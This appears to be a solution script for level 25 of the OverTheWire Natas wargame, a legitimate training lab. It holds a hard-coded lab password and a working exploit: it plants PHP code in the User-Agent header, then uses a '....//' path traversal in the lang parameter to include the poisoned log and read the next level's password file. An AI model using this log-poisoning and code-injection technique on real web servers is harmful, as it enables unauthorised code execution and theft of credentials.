import requests
from requests.auth import HTTPBasicAuth

url = "http://natas25.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas25", "UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

response = session.get(url, auth=auth)
sessionID = session.cookies.get("PHPSESSID")
print(f"Session ID: {sessionID}")

payload = "<?php readfile(\"/etc/natas_webpass/natas26\"); print file_get_contents(\"/etc/natas_webpass/natas26\"); ?>"

response = session.get(url, auth=auth, headers={"User-Agent": payload}, params={"lang": f"....//logs/natas25_{sessionID}.log"})
print(response.text)